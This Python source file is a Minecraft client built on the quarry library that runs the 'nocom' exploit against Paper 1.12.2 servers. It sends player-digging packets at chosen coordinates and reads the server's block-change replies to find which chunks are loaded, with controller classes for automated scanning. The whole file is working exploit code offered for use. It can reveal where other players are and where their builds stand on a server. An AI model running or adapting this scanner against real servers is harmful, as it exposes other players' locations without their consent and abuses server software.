"""
A client to check if chunks are loaded on a server using the nocom exploit

Effects paper 1.12.2 servers.
"""

import auth
from twisted.internet import reactor,defer,stdio
from quarry.net.client import ClientFactory, SpawningClientProtocol
import json
import random
import logging
from twisted.protocols.basic import LineReceiver

class NocomClientProtocol(SpawningClientProtocol):
    """
    A minecraft client build on quarry that can send nocom packets.
    You probobly want to subclass this.
    """
    # Log all packets sent by server
    seq = 0
    control = None
    packets_per_tick = 20
    def packet_unhandled(self, buff, name):
        """
        Ignore unhandled packets.
        """
        buff.discard()
    def packet_block_change(self, buff):
        """
        Handles block_change packets sent by the paper server if the queryed chuck us loaded
        """
        pos = buff.unpack_position()
        block = buff.unpack_varint()
        self.update(pos[0], pos[1], pos[2], block)
    def get_next(self):
        """
        Dummy next function, you should overide this
        """
        return None
    def update(self, x, y, z, block):
        """
        Dummy on_update function. you should override this
        """
        pass
    def query_next(self):
        for _ in range(self.packets_per_tick):
            if self.pos_look[1] != 0: 
                if ( self.protocol_mode == 'play' ): 
                    cor = self.get_next()
                    if cor != None:
                        self.query_block(cor[0], cor[1], cor[2])
    def query_block(self, x,y,z):
        """
        Sends a player digging packet with given (block) cordinates.
        """
        #print(x,y,z)
        self.send_packet(
                "player_digging", 
                self.buff_type.pack_varint(2), # start digging
                self.buff_type.pack_position(x,y,z), # Position
                self.buff_type.pack("b",1), # face -Y
                #self.buff_type.pack_varint(self.seq) # sequence number
        )
        
        self.seq += 1
        #logging.info(f"breaking ({x}, {y}, {z})")
    def setup(self):
        self.ticker.add_loop(1, self.query_next)

class NocomControler:
    """
    Dummy controler, should be subclassed
    """
    controler = None
    def should_exit(self) -> bool:
        pass
    def next_location(self) -> [int]:
        pass
    def on_update(self, x: int, y:int, z:int, block: int):
        pass
    def on_exit(self):
        pass


class ControledNocomClientProtocol(NocomClientProtocol):
    """
    NocomClientProtocol with support for controlers.

    You should set the .controler property with the factory
    """
    def on_close(self):
        self.controler.on_exit()
    def get_next(self):
        if self.controler.should_exit():
            self.close()
            self.controler.on_exit()
        return self.controler.next_location()
    def update(self,x,y,z,block):
        self.controler.on_update(x,y,z,block)
